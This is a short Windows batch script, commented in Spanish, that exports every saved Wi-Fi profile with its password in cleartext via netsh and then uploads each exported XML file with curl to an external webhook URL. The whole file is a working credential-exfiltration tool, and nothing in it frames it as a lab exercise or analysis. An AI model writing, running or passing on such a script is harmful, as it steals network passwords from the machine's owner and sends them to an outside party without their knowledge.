@echo off
REM — 1) Asegura que la carpeta donde está este .bat exista
if not exist "%~dp0" mkdir "%~dp0"

REM — 2) Exporta TODOS los perfiles Wi-Fi con clave en claro
netsh wlan export profile folder="%~dp0" key=clear

REM — 3) Sube cada XML al webhook
for %%F in ("%~dp0*.xml") do (
  curl.exe -H "Content-Type: application/xml" --data-binary "@%%F" ^
    https://webhook-test.com/dac752f76cec8c9fa7e9cff1baac3d64
  echo Enviado %%~nxF
)

REM — 4) Pausa para que veas los resultados
pause
